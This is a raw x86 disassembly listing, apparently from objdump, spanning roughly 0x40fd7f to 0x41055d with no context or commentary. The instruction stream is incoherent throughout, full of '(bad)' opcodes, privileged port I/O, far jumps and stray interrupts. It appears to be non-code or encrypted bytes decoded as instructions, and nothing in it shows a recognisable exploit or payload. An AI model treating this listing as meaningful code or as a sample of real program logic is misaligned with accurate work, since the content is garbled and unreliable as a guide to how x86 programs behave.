  40fd7f:	outs   dx,BYTE PTR ds:[esi]
  40fd80:	and    al,0x8e
  40fd82:	lock push eax
  40fd84:	je     0x40fd79
  40fd86:	nop
  40fd87:	je     0x40fd2c
  40fd89:	push   0x1a3ba4c3
  40fd8e:	sbb    ah,ch
  40fd90:	xchg   edi,eax
  40fd92:	dec    ecx
  40fd93:	adc    DWORD PTR [edi+0x559f73ec],0xffffffdf
  40fd9a:	pop    esp
  40fd9b:	mov    esp,0xb6279980
  40fda0:	mov    al,0xb5
  40fda2:	sub    bl,BYTE PTR [eax+0x48]
  40fda5:	data16 ins BYTE PTR es:[edi],dx
  40fda7:	inc    eax
  40fda8:	pop    edx
  40fda9:	fwait
  40fdaa:	xor    ch,dh
  40fdac:	in     al,0xe4
  40fdae:	cmp    eax,0x38840619
  40fdb3:	bound  ebp,QWORD PTR [edi+0x4efe9783]
  40fdb9:	fild   WORD PTR [esi-0x18]
  40fdbc:	(bad)  
  40fdbd:	cld    
  40fdbe:	bound  ecx,QWORD PTR [eax-0x403e0389]
  40fdc4:	loopne 0x40fe15
  40fdc6:	stos   BYTE PTR es:[edi],al
  40fdc7:	and    BYTE PTR [esi-0x293784b5],0x8a
  40fdce:	mov    eax,ds:0xd7b2418d
  40fdd3:	xchg   DWORD PTR [edx],esp
  40fdd5:	bound  edi,QWORD PTR [esi]
  40fdd7:	jl     0x40fdfd
  40fdd9:	mov    ds:0xb3b06a6a,al
  40fdde:	xor    eax,0x151262d1
  40fde3:	js     0x40fdbb
  40fde5:	pop    esp
  40fde6:	scas   eax,DWORD PTR es:[edi]
  40fde7:	inc    edi
  40fde8:	pushf  
  40fde9:	jmp    0x40fd96
  40fdeb:	lods   al,BYTE PTR ds:[esi]
  40fdec:	dec    ebx
  40fded:	dec    BYTE PTR [eax+0x3e2f89b5]
  40fdf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdf4:	or     eax,0x27f18cbd
  40fdf9:	cmp    ecx,DWORD PTR [ebx]
  40fdfb:	sub    DWORD PTR [eax],ebp
  40fdfd:	leave  
  40fdfe:	xor    ebp,DWORD PTR [esp+edi*2+0x7f]
  40fe02:	out    dx,eax
  40fe03:	push   ebx
  40fe04:	dec    DWORD PTR [esi-0x7fdb3e0e]
  40fe0a:	mov    al,0x3c
  40fe0c:	jnp    0x40fe87
  40fe0e:	sub    eax,0x501876b3
  40fe13:	scas   eax,DWORD PTR es:[edi]
  40fe14:	adc    bh,cl
  40fe16:	data16 mov ah,0xf2
  40fe19:	sbb    eax,0xd92ebdff
  40fe1e:	leave  
  40fe1f:	push   esi
  40fe20:	dec    esp
  40fe21:	sbb    DWORD PTR [edx+0x3b],0x572474d7
  40fe28:	mov    eax,ds:0x9205a9a2
  40fe2d:	jb     0x40fe8a
  40fe2f:	(bad)  
  40fe30:	cs inc di
  40fe33:	lods   al,BYTE PTR ds:[esi]
  40fe34:	or     eax,0xcf0927a7
  40fe39:	add    DWORD PTR [edi+0x272448bc],esi
  40fe3f:	mov    ah,0xd9
  40fe41:	fild   DWORD PTR [ecx]
  40fe43:	or     ecx,edx
  40fe45:	fistp  DWORD PTR [esi+0x63]
  40fe48:	ret    
  40fe49:	mov    cl,0xd9
  40fe4b:	mov    BYTE PTR [edi+0x3b],dh
  40fe4e:	sub    esi,DWORD PTR [edi]
  40fe50:	pushf  
  40fe51:	jbe    0x40fe4f
  40fe53:	mov    ebp,0x95290ff1
  40fe58:	out    0x1a,eax
  40fe5a:	js     0x40feac
  40fe5c:	pop    edx
  40fe5d:	push   esp
  40fe5e:	push   0x57a713e1
  40fe63:	loop   0x40fe4d
  40fe65:	mov    ds:0xe3fa60af,al
  40fe6a:	add    BYTE PTR ds:0x70f1f36a,al
  40fe70:	repnz (bad) 
  40fe72:	out    0xe1,eax
  40fe74:	mov    bh,0xf1
  40fe76:	scas   al,BYTE PTR es:[edi]
  40fe77:	mov    bh,0x82
  40fe79:	or     eax,0x70116957
  40fe7e:	loope  0x40fefe
  40fe80:	fistp  QWORD PTR [edi-0x6ed23d3a]
  40fe86:	push   esp
  40fe87:	out    dx,eax
  40fe88:	xchg   esi,eax
  40fe89:	xchg   edx,eax
  40fe8a:	mov    DWORD PTR [edi+0x64],ebp
  40fe8d:	adc    DWORD PTR [esi+0x7acba017],edx
  40fe93:	adc    edx,0xffffff98
  40fe96:	jp     0x40feae
  40fe98:	xor    esi,DWORD PTR [esi-0x2b81dbc5]
  40fe9e:	sub    esp,DWORD PTR [ebp*1+0x63abe610]
  40fea5:	jne    0x40ff0a
  40fea7:	outs   dx,DWORD PTR ds:[esi]
  40fea8:	mov    ds:0xe53ddd78,eax
  40fead:	mov    DWORD PTR [eax],esi
  40feaf:	das    
  40feb0:	retf   
  40feb1:	rcl    DWORD PTR [eax-0x79],1
  40feb4:	(bad)  
  40feb5:	pop    edi
  40feb6:	cmp    BYTE PTR [ecx-0xfb9c3ee],0x7d
  40febd:	retf   
  40febe:	xchg   esp,eax
  40febf:	popa   
  40fec0:	clc    
  40fec1:	fist   DWORD PTR ds:0x8b0fcaff
  40fec7:	xor    DWORD PTR [edx-0x3947c102],edx
  40fecd:	mov    DWORD PTR [esi],edx
  40fecf:	fmul   DWORD PTR [esi-0x5]
  40fed2:	fs inc esi
  40fed4:	jo     0x40ff0f
  40fed6:	push   ebx
  40fed7:	ins    DWORD PTR es:[edi],dx
  40fed8:	pop    ecx
  40fed9:	xchg   edi,eax
  40feda:	js     0x40ff05
  40fedc:	in     al,dx
  40fedd:	pop    esi
  40fede:	fisubr DWORD PTR [ebp-0x74]
  40fee1:	repz pop esp
  40fee3:	arpl   WORD PTR [ebp+0x6b],cx
  40fee6:	mov    WORD PTR [esi-0x190fbec1],gs
  40feec:	test   DWORD PTR [eax-0x2999945c],eax
  40fef2:	cwde   
  40fef3:	and    esp,DWORD PTR ds:0x9cd0a010
  40fef9:	dec    edx
  40fefa:	xor    BYTE PTR [esi+0x5646ad2e],0xac
  40ff01:	push   ebx
  40ff02:	mov    edi,0x1c5668b
  40ff07:	xlat   BYTE PTR ds:[ebx]
  40ff08:	daa    
  40ff09:	xor    bl,BYTE PTR ds:0x7b6076b1
  40ff0f:	repnz push ss
  40ff11:	(bad)
  40ff15:	js     0x40ff2f
  40ff17:	push   esp
  40ff18:	jl     0x40fef0
  40ff1a:	push   cs
  40ff1b:	cdq    
  40ff1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff1d:	scas   eax,DWORD PTR es:[edi]
  40ff1e:	add    ebp,DWORD PTR [ecx-0x61800654]
  40ff24:	sti    
  40ff25:	push   edx
  40ff26:	(bad)  
  40ff27:	pop    ebx
  40ff28:	push   es
  40ff29:	popf   
  40ff2a:	mov    esp,DWORD PTR [esi-0x7bdc546a]
  40ff30:	(bad)  
  40ff31:	adc    eax,0xdca3434e
  40ff36:	mov    esp,0xb6e845ea
  40ff3b:	(bad)  
  40ff3c:	and    al,0x4d
  40ff3e:	push   edx
  40ff3f:	cs retf 0x3b72
  40ff43:	adc    eax,DWORD PTR [ecx]
  40ff45:	jl     0x40ff31
  40ff47:	outs   dx,BYTE PTR ds:[esi]
  40ff48:	mov    edx,0x4da16bf3
  40ff4d:	jge    0x40ff74
  40ff4f:	outs   dx,DWORD PTR ds:[esi]
  40ff50:	test   DWORD PTR [ebp-0x7],eax
  40ff53:	sbb    esi,esp
  40ff55:	and    ch,bh
  40ff57:	pop    ss
  40ff58:	fwait
  40ff59:	push   edx
  40ff5a:	add    DWORD PTR [ebp-0x258a864f],ebx
  40ff60:	jnp    0x40fee8
  40ff62:	mov    esi,0xe0f69e95
  40ff67:	add    DWORD PTR [eax+0x65f5d4c6],edi
  40ff6d:	addr16 js 0x40ff76
  40ff70:	ds mov cl,0xe0
  40ff74:	inc    esp
  40ff75:	dec    edx
  40ff76:	dec    ebp
  40ff77:	fwait
  40ff78:	push   esp
  40ff79:	jbe    0x40fff9
  40ff7b:	repz fistp QWORD PTR [edi]
  40ff7e:	test   BYTE PTR [edx-0x3],bl
  40ff81:	jns    0x40ff06
  40ff83:	push   ss
  40ff84:	cmp    edi,ebp
  40ff86:	loope  0x40ff22
  40ff88:	(bad)  
  40ff89:	mov    bh,0x98
  40ff8b:	xchg   edi,eax
  40ff8c:	les    edx,FWORD PTR [esi-0x25262f92]
  40ff92:	or     BYTE PTR [ebx-0x59],ch
  40ff95:	fwait
  40ff96:	pop    edi
  40ff97:	outs   dx,BYTE PTR ds:[esi]
  40ff98:	push   eax
  40ff99:	cmp    BYTE PTR [edi],ch
  40ff9b:	or     bh,cl
  40ff9d:	adc    bl,BYTE PTR [ebx+ecx*8-0x8cb3f86]
  40ffa4:	cmp    al,0x43
  40ffa6:	jg     0x40ff3e
  40ffa8:	sub    BYTE PTR [ecx],0x9e
  40ffab:	pop    ecx
  40ffac:	jge    0x40ff87
  40ffae:	clc    
  40ffaf:	push   ss
  40ffb0:	mov    eax,0xe7b34b5
  40ffb5:	jno    0x40fff7
  40ffb7:	retf   0x9430
  40ffba:	dec    edx
  40ffbb:	rcr    DWORD PTR [ecx-0x7e31d98c],1
  40ffc1:	xor    al,0xe3
  40ffc3:	cwde   
  40ffc4:	inc    esp
  40ffc5:	or     BYTE PTR [ecx+0x47c5c39f],al
  40ffcb:	idiv   BYTE PTR [eax+0x69]
  40ffce:	mov    eax,0xc602b5ad
  40ffd3:	pop    esp
  40ffd4:	inc    dh
  40ffd6:	psubusb mm1,QWORD PTR [ebp-0x30]
  40ffda:	add    DWORD PTR [esi-0x6cc66935],0xe13e4d6e
  40ffe4:	lods   al,BYTE PTR ds:[esi]
  40ffe5:	cmp    BYTE PTR [edi],0x98
  40ffe8:	repnz cs (bad) 
  40ffec:	xor    eax,DWORD PTR [eax]
  40ffee:	xor    edx,ecx
  40fff0:	outs   dx,BYTE PTR ds:[esi]
  40fff1:	xor    bl,BYTE PTR [eax]
  40fff3:	cs dec ebp
  40fff5:	imul   eax,edx,0xffffffc0
  40fff8:	lods   al,BYTE PTR ds:[esi]
  40fff9:	imul   edi,esi,0x61
  40fffc:	mov    esp,0xfd98d9d
  410001:	lods   al,BYTE PTR ds:[esi]
  410002:	pop    edx
  410003:	xchg   ecx,esi
  410005:	ss mov ah,0x4f
  410008:	lahf   
  410009:	out    0x82,eax
  41000b:	ror    BYTE PTR [ecx+0x11],1
  41000e:	push   esi
  41000f:	ja     0x40fffa
  410011:	sub    dl,ch
  410013:	dec    ebx
  410014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410015:	lds    ebp,FWORD PTR [edx-0x42]
  410018:	(bad)  
  410019:	sub    bh,BYTE PTR [esi]
  41001b:	iret   
  41001c:	pop    ebx
  41001d:	mov    eax,0xb15f809f
  410022:	mov    eax,ds:0xcfeadffb
  410027:	nop
  410028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410029:	sub    DWORD PTR [edi-0x78],esi
  41002c:	nop
  41002d:	xor    al,BYTE PTR [eax]
  41002f:	repz push 0x80436d9d
  410035:	xor    DWORD PTR [edi+0x60],eax
  410038:	mov    ds:0x16d7b769,al
  41003d:	je     0x410064
  41003f:	add    cl,BYTE PTR [eax]
  410041:	(bad)  
  410042:	xchg   ebp,eax
  410043:	or     al,0x70
  410045:	or     al,BYTE PTR [edi-0x18c49d47]
  41004b:	ds enter 0x423d,0x24
  410050:	push   ebp
  410051:	aad    0x55
  410053:	test   al,0xeb
  410055:	push   edi
  410056:	out    dx,eax
  410057:	inc    esi
  410058:	fidivr DWORD PTR [edi+0xa]
  41005b:	or     al,0xdd
  41005d:	sub    eax,0xbd79580c
  410062:	or     ch,BYTE PTR [edi-0x570a09]
  410068:	arpl   bx,bx
  41006a:	mov    di,cs
  41006d:	sbb    dh,BYTE PTR [ebx+0x5218737c]
  410073:	imul   esp,DWORD PTR [ebp-0x42fe2fdd],0xcbcb150e
  41007d:	adc    ebx,DWORD PTR [ebp+0xb844c45]
  410083:	daa    
  410084:	rcr    bh,0xb6
  410087:	mov    ds:0xf3854dad,eax
  41008c:	out    dx,eax
  41008d:	jmp    0x267b3002
  410092:	mov    ebx,0x5376baea
  410097:	daa    
  410098:	xor    DWORD PTR [ecx+0x7dc7bcaf],ecx
  41009e:	ror    BYTE PTR [ebp-0xb],1
  4100a1:	dec    ebx
  4100a2:	outs   dx,DWORD PTR ds:[esi]
  4100a3:	jns    0x4100f5
  4100a5:	pop    ds
  4100a6:	aad    0x60
  4100a8:	enter  0x139e,0x5
  4100ac:	cmp    eax,DWORD PTR [edi+0x7ca4617d]
  4100b2:	fiadd  DWORD PTR [edi]
  4100b4:	jmp    0x2bbe:0xb32ce30e
  4100bb:	shr    eax,cl
  4100bd:	fdivr  QWORD PTR [ebx]
  4100bf:	mov    edx,0x62570d7
  4100c4:	add    eax,0xf7f811d6
  4100c9:	sbb    al,0xde
  4100cb:	retf   
  4100cc:	ins    DWORD PTR es:[edi],dx
  4100cd:	sbb    al,0x7c
  4100cf:	xor    al,0xa7
  4100d1:	mov    ecx,0x7210df68
  4100d6:	push   edi
  4100d7:	(bad)  
  4100d8:	out    0x70,eax
  4100da:	nop    DWORD PTR [edi-0x54564bf9]
  4100e1:	aad    0xb9
  4100e3:	daa    
  4100e4:	les    ebp,FWORD PTR [edi]
  4100e6:	dec    edx
  4100e7:	and    ecx,DWORD PTR [ebx+0x57bdc7ad]
  4100ed:	pop    edi
  4100ee:	push   ds
  4100ef:	inc    edi
  4100f0:	push   eax
  4100f1:	mov    edx,DWORD PTR ds:0x9e8e647c
  4100f7:	daa    
  4100f8:	lock push ebx
  4100fa:	sub    dl,BYTE PTR [edx+edx*4+0x6db93226]
  410101:	dec    ebp
  410102:	adc    eax,0xe70a1d31
  410107:	out    dx,eax
  410108:	imul   edx,edi,0xffffffe9
  41010b:	add    BYTE PTR [edi-0x6e4b9d7e],al
  410111:	xchg   edi,eax
  410112:	lahf   
  410113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410114:	in     al,dx
  410115:	inc    ecx
  410116:	inc    ebx
  410117:	add    DWORD PTR [ebp-0x673eb9f6],esi
  41011d:	push   ebx
  41011e:	test   BYTE PTR [edx+0x40],0x71
  410122:	and    BYTE PTR [edi+0x2b3920d5],bl
  410128:	push   0x36
  41012a:	ja     0x41010d
  41012c:	repz retf 
  41012e:	mov    ecx,0x67c400b1
  410133:	push   ecx
  410134:	push   edi
  410135:	inc    ecx
  410136:	je     0x4101a3
  410138:	xor    DWORD PTR [ecx],eax
  41013a:	and    DWORD PTR [ebx+eiz*4-0x68],edi
  41013e:	sbb    edi,esi
  410140:	and    al,0x2
  410142:	xor    ebx,edi
  410144:	enter  0x44a4,0x65
  410148:	mov    ds:0xcd7f985a,al
  41014d:	popa   
  41014e:	mov    esi,0x64056ad3
  410153:	xchg   ebx,eax
  410154:	cmp    ch,BYTE PTR [edi]
  410156:	xchg   BYTE PTR [edi],ah
  410158:	scas   eax,DWORD PTR es:[edi]
  410159:	ja     0x410134
  41015b:	fist   DWORD PTR [ebp-0xb]
  41015e:	jo     0x410184
  410160:	les    edx,FWORD PTR [edi]
  410162:	mov    eax,ds:0xde173656
  410167:	enter  0x51ce,0xcb
  41016b:	push   ebp
  41016c:	inc    esp
  41016d:	mov    edi,0xdac09b41
  410172:	lds    esp,FWORD PTR ds:0x7e79d370
  410178:	push   edi
  410179:	xchg   ebx,eax
  41017a:	and    DWORD PTR [edi-0x2aabbbb1],esp
  410180:	cmc    
  410181:	loop   0x410142
  410183:	pop    edx
  410184:	outs   dx,DWORD PTR ds:[esi]
  410185:	pushf  
  410186:	stos   DWORD PTR es:[edi],eax
  410187:	sub    ecx,DWORD PTR [ecx+0x37]
  41018a:	shr    DWORD PTR [ebp+ebp*8+0x6834bae0],cl
  410191:	(bad)  
  410192:	popf   
  410193:	mov    esp,0xf7893748
  410198:	push   ecx
  410199:	sbb    ch,BYTE PTR [esi+0x49]
  41019c:	pop    esp
  41019d:	inc    ebx
  41019e:	clc    
  41019f:	aad    0x4b
  4101a1:	sbb    ebp,0x28
  4101a4:	xor    al,0xa4
  4101a6:	pop    esi
  4101a7:	or     ecx,DWORD PTR [edx+0x4ff1831b]
  4101ad:	xor    eax,0x3c358d7b
  4101b2:	add    ah,BYTE PTR ds:0x78c6626f
  4101b8:	mov    ds:0xe5a1f5a9,al
  4101bd:	mov    WORD PTR [eax],gs
  4101bf:	fnstcw WORD PTR [edx-0x1b2c8ad5]
  4101c5:	sub    eax,DWORD PTR [esi-0x28ee41db]
  4101cb:	fistp  WORD PTR ds:0xf71b494
  4101d1:	not    al
  4101d3:	dec    esp
  4101d4:	or     eax,0x75915e9d
  4101d9:	mov    esp,DWORD PTR [edi-0x71]
  4101dc:	add    eax,0x5fb0de84
  4101e1:	test   al,0x3f
  4101e3:	mov    ds:0xa76cbab3,al
  4101e8:	push   ebp
  4101e9:	and    al,0xb4
  4101eb:	clc    
  4101ec:	xor    eax,0x7ec45ea2
  4101f1:	pop    esi
  4101f2:	inc    ecx
  4101f3:	inc    ebp
  4101f4:	dec    edi
  4101f5:	scas   al,BYTE PTR es:[edi]
  4101f6:	mov    eax,0x472cbfe9
  4101fb:	(bad)  
  4101fc:	out    0x43,al
  4101fe:	fnstenv [ecx-0x637feb6d]
  410204:	cmp    ah,BYTE PTR [esi-0x37]
  410207:	gs das 
  410209:	pop    ds
  41020a:	cmp    al,0xb7
  41020c:	mov    esp,0x1f7ccb44
  410211:	fmul   DWORD PTR [ebx+ecx*1-0x29293a86]
  410218:	adc    esp,DWORD PTR [esp+ebx*8+0x40]
  41021c:	fiadd  DWORD PTR ds:0x852c886
  410222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410223:	pop    ebx
  410224:	or     dh,BYTE PTR [esi]
  410226:	adc    DWORD PTR [esi-0x4b],esp
  410229:	jbe    0x410299
  41022b:	gs push 0xffffff99
  41022e:	mov    ecx,0xd922f32f
  410233:	in     al,0xd4
  410235:	push   0x692fbc95
  41023a:	ror    ecx,cl
  41023c:	sub    DWORD PTR [ecx+0x4c10d0a5],esi
  410242:	mov    BYTE PTR [eax],bh
  410244:	cwde   
  410245:	xor    bh,BYTE PTR [edi+0xc157560]
  41024b:	sub    al,0xc2
  41024d:	mov    esi,0x5502f798
  410252:	mov    bl,0x9d
  410254:	lds    eax,FWORD PTR [edx+0x10335432]
  41025a:	sub    eax,0xe1740f93
  41025f:	dec    esp
  410260:	fnsave [ecx-0x4e76e6fb]
  410266:	test   al,0x52
  410268:	lock or DWORD PTR [ebx-0x6278b2b6],0xffffffd9
  410270:	adc    al,0xb4
  410272:	add    dl,bh
  410274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410275:	test   al,0x93
  410277:	rol    ah,1
  410279:	pop    ss
  41027a:	fbld   TBYTE PTR [ecx+0x4b]
  41027d:	or     DWORD PTR [eax],ebx
  41027f:	std    
  410280:	aas    
  410281:	jnp    0x41027f
  410283:	outs   dx,BYTE PTR ds:[esi]
  410284:	fcomp  QWORD PTR [edx+eiz*1]
  410287:	add    al,0x9f
  410289:	sbb    eax,0x82f92b55
  41028e:	ret    
  41028f:	xchg   esp,eax
  410290:	lea    edx,[edx+0x0]
  410293:	outs   dx,DWORD PTR ds:[esi]
  410294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410295:	pop    ebx
  410296:	mov    eax,ds:0x8743c801
  41029b:	and    BYTE PTR [ecx+0xa6ca0d0],bl
  4102a1:	shl    bh,1
  4102a3:	packuswb mm6,QWORD PTR [esi-0x40]
  4102a7:	push   0x60
  4102a9:	and    DWORD PTR [ebp+0x37],esp
  4102ac:	fstp   TBYTE PTR [ecx+0x6ee6f8de]
  4102b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b3:	in     eax,0x9
  4102b5:	int3   
  4102b6:	inc    eax
  4102b7:	xchg   esi,eax
  4102b8:	mov    ebx,0x24c34c4
  4102bd:	hlt    
  4102be:	xor    ebx,DWORD PTR [ecx+eiz*1-0xe]
  4102c2:	mov    eax,gs:0xc0438257
  4102c8:	imul   edi,DWORD PTR [ecx],0x784f9f8d
  4102ce:	sbb    eax,0x937b7fe6
  4102d3:	and    DWORD PTR [ecx-0x5cf290cf],edi
  4102d9:	mov    eax,0x77749721
  4102de:	ret    0x7cc5
  4102e1:	retf   0xab23
  4102e4:	mov    ss,WORD PTR [esi]
  4102e6:	xchg   ebx,eax
  4102e7:	je     0x410301
  4102e9:	cmp    esp,DWORD PTR [esi+0x4857c83b]
  4102ef:	jo     0x41036f
  4102f1:	xchg   BYTE PTR [edi-0x504b6717],bh
  4102f7:	inc    edx
  4102f8:	add    al,0xcc
  4102fa:	inc    ebx
  4102fb:	sbb    BYTE PTR [ecx],ch
  4102fd:	fst    st(2)
  4102ff:	xlat   BYTE PTR ds:[ebx]
  410300:	pop    edi
  410301:	imul   ecx,ebp,0x2611ebba
  410307:	inc    esp
  410308:	pushf  
  410309:	pop    ds
  41030a:	sbb    dh,bl
  41030c:	jns    0x4102e4
  41030e:	pop    ss
  41030f:	mov    al,ds:0x3a59360c
  410314:	push   edi
  410315:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410317:	jmp    0x410395
  410319:	sar    esp,cl
  41031b:	dec    esi
  41031c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41031d:	dec    eax
  41031e:	add    cl,BYTE PTR [ecx-0x394fdaf4]
  410324:	pop    ss
  410325:	pop    ds
  410326:	mov    al,0x4e
  410328:	cwde   
  410329:	repnz cmp eax,0x582b3f67
  41032f:	push   ds
  410330:	mov    eax,ds:0x41ba43a4
  410335:	or     BYTE PTR [ebp+0x4c794baa],al
  41033b:	and    BYTE PTR [edi],bl
  41033d:	push   ebx
  41033e:	mov    ds:0x1bd39787,al
  410343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410345:	mov    cl,0x8c
  410347:	daa    
  410348:	retf   0xb4f6
  41034b:	push   edx
  41034c:	icebp  
  41034d:	jb     0x41033e
  41034f:	and    dh,BYTE PTR ds:0x5d0370a5
  410355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410356:	mov    ecx,0xe8b6821d
  41035b:	imul   si,WORD PTR [esi],0x2df
  410360:	and    esi,DWORD PTR [edx+ecx*8+0x6c7d645f]
  410367:	sub    bl,dh
  410369:	imul   ebp,DWORD PTR [ecx],0x5e
  41036c:	fdivr  st,st(1)
  41036e:	lea    ebp,[ecx]
  410370:	retf   
  410371:	cmp    BYTE PTR [edi-0x66],0xde
  410375:	push   esi
  410376:	sbb    eax,0x14b4cdc3
  41037b:	push   eax
  41037c:	int    0xa4
  41037e:	scas   al,BYTE PTR es:[edi]
  41037f:	push   ecx
  410380:	das    
  410381:	es add ebp,eax
  410384:	mov    ebx,?
  410386:	(bad)  
  410387:	out    dx,al
  410388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410389:	call   0x9c48f0ab
  41038e:	in     al,dx
  41038f:	and    dl,cl
  410391:	mov    esp,0x4080fefd
  410396:	mov    al,ds:0x19b834e0
  41039b:	push   es
  41039c:	loopne 0x41041a
  41039e:	jnp    0x41035f
  4103a0:	shl    DWORD PTR [ebp+0x15],cl
  4103a3:	mov    ecx,0x3a426b2b
  4103a8:	sbb    ebx,DWORD PTR [esi-0xc8d3595]
  4103ae:	scas   eax,DWORD PTR es:[edi]
  4103af:	aad    0xc9
  4103b1:	cmc    
  4103b2:	mov    ch,0x86
  4103b4:	inc    esp
  4103b5:	lods   al,BYTE PTR ds:[esi]
  4103b6:	mov    DWORD PTR [edi-0x760247c],ecx
  4103bc:	pop    eax
  4103bd:	jae    0x410340
  4103bf:	mov    cl,0xa9
  4103c1:	inc    ebx
  4103c2:	inc    esi
  4103c3:	and    DWORD PTR [ebx],0xfffffff2
  4103c6:	test   eax,0xe50a0e3b
  4103cb:	into   
  4103cc:	inc    ecx
  4103cd:	mov    ds:0x3ed0d399,al
  4103d2:	ror    edi,1
  4103d4:	or     cl,BYTE PTR [esi]
  4103d6:	xchg   edx,eax
  4103d7:	sub    BYTE PTR [esi],ah
  4103d9:	adc    eax,0xcdee3a58
  4103de:	int    0xd6
  4103e0:	and    eax,DWORD PTR [ecx+edx*4]
  4103e3:	lahf   
  4103e4:	data16 sub BYTE PTR [ebp+0x5e],bh
  4103e8:	sub    BYTE PTR [edi+0x22],dl
  4103eb:	and    ah,BYTE PTR [eax+0x6f]
  4103ee:	ss lahf 
  4103f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103f1:	xor    BYTE PTR [esi-0x5e],bl
  4103f4:	mov    ah,0xdb
  4103f6:	mov    dh,0x19
  4103f8:	mov    ebx,0x5c037af5
  4103fd:	adc    al,0xc6
  4103ff:	xchg   ebx,eax
  410400:	sti    
  410401:	push   eax
  410402:	int    0xde
  410404:	jns    0x410431
  410406:	push   esp
  410407:	mov    ebx,0x4ce0350b
  41040c:	jmp    0x75c0:0x89d5ec6a
  410413:	popa   
  410414:	lock into 
  410416:	xor    BYTE PTR [edx+0x23],0xa
  41041a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41041b:	shl    dl,0xac
  41041e:	sbb    eax,0x51383942
  410423:	aam    0xa7
  410425:	xchg   ebx,eax
  410426:	in     eax,0x52
  410428:	jne    0x4103c3
  41042a:	inc    esp
  41042b:	hlt    
  41042c:	or     BYTE PTR [esi],bh
  41042e:	leave  
  41042f:	xchg   esi,eax
  410430:	ror    BYTE PTR [edx],0xc5
  410433:	es icebp 
  410435:	pop    ecx
  410436:	mov    cl,0xee
  410438:	imul   esi,DWORD PTR ds:0x1ff3c912,0xf
  41043f:	sbb    eax,0x54552ff5
  410444:	dec    ecx
  410445:	pusha  
  410446:	int3   
  410447:	sbb    edi,0x2c6978e2
  41044d:	(bad)  
  41044e:	mov    ebp,0xa33b52d8
  410453:	inc    eax
  410454:	add    BYTE PTR [ebp+0x48918fe8],ah
  41045a:	or     ch,BYTE PTR [edx-0x67ac8949]
  410460:	jbe    0x41041f
  410462:	xor    eax,0x33201fa
  410467:	xchg   ebp,eax
  410468:	mov    esp,0xf40a2c78
  41046d:	out    dx,eax
  41046e:	repz cmp eax,esp
  410471:	jle    0x4103fa
  410473:	sahf   
  410474:	jo     0x41042e
  410476:	jl     0x410417
  410478:	xchg   esp,eax
  410479:	pop    edi
  41047a:	push   0xffffffa1
  41047c:	fsubr  QWORD PTR [esi+0x52a50512]
  410482:	mov    ah,0x86
  410484:	retf   
  410485:	test   BYTE PTR [ebp+ecx*4-0x39],bl
  410489:	push   ebx
  41048a:	outs   dx,DWORD PTR ds:[esi]
  41048b:	(bad)  
  41048c:	rcr    DWORD PTR [edx-0x11515503],0xa5
  410493:	mov    ebp,edx
  410495:	push   0xd5c63ee5
  41049a:	mov    bh,al
  41049c:	xchg   BYTE PTR [edx-0x45e9b4d0],dh
  4104a2:	cmp    DWORD PTR [ebx-0x48f44140],0x39
  4104a9:	inc    ebp
  4104aa:	mov    dh,al
  4104ac:	cmp    al,0xb5
  4104ae:	dec    ebp
  4104af:	sbb    DWORD PTR [ebx-0x3e],0xfffffff9
  4104b3:	sub    eax,0x5a078e8
  4104b9:	push   cs
  4104ba:	jecxz  0x41046e
  4104bc:	sbb    bh,BYTE PTR [edi]
  4104be:	test   al,0x89
  4104c0:	gs inc ecx
  4104c2:	mov    ecx,0xcaa2d304
  4104c7:	outs   dx,DWORD PTR ds:[esi]
  4104c8:	mov    dh,0x2d
  4104ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104cb:	mov    al,0xef
  4104cd:	jg     0x4104e9
  4104cf:	inc    ebx
  4104d0:	inc    ebx
  4104d1:	xchg   ecx,eax
  4104d2:	rol    DWORD PTR [edx+0x17a73c20],0x81
  4104d9:	mov    eax,ds:0x64246429
  4104de:	mov    edx,0x618c5fe8
  4104e3:	lds    esi,FWORD PTR [ebp+0x7d7bfc35]
  4104e9:	sbb    eax,0x81f4d1ce
  4104ee:	add    ecx,DWORD PTR [esi-0x8bb238c]
  4104f4:	pop    edx
  4104f5:	xchg   edi,eax
  4104f6:	sub    al,0x1b
  4104f8:	add    bh,al
  4104fa:	ret    0x492f
  4104fd:	xor    al,BYTE PTR [edx]
  4104ff:	dec    eax
  410500:	xor    DWORD PTR [ecx+0x285abcd0],esp
  410506:	or     al,0x9c
  410508:	adc    ebx,ebx
  41050a:	and    DWORD PTR [esi+0x18],0xffffff8e
  41050e:	inc    edi
  41050f:	pop    edi
  410510:	lea    edi,[edi-0x7b]
  410513:	repz dec esp
  410515:	sub    BYTE PTR [edx-0x176cc607],dh
  41051b:	sub    DWORD PTR [esp+edx*8+0x46],eax
  41051f:	mov    ch,0x1a
  410521:	add    BYTE PTR [eax+0x2527cd7],al
  410527:	sbb    dh,BYTE PTR [ebp+0x4d9378b7]
  41052d:	lods   eax,DWORD PTR ds:[esi]
  41052e:	pop    ss
  41052f:	ret    
  410530:	add    ah,0xac
  410533:	adc    edx,DWORD PTR [esi+0x6da95064]
  410539:	jno    0x410518
  41053b:	call   0x8f654b93
  410540:	call   0xfa9f09df
  410545:	fidiv  DWORD PTR [edx+esi*2-0x24]
  410549:	push   es
  41054a:	xchg   eax,esp
  41054c:	adc    eax,0x10cf3df
  410551:	pop    ecx
  410552:	push   esi
  410553:	mov    WORD PTR cs:[eax],?
  410556:	mov    ah,0xa1
  410558:	mov    al,0xa5
  41055a:	xchg   ecx,eax
  41055b:	ins    BYTE PTR es:[edi],dx
  41055c:	dec    edx
  41055d:	mov    dl,0xaf
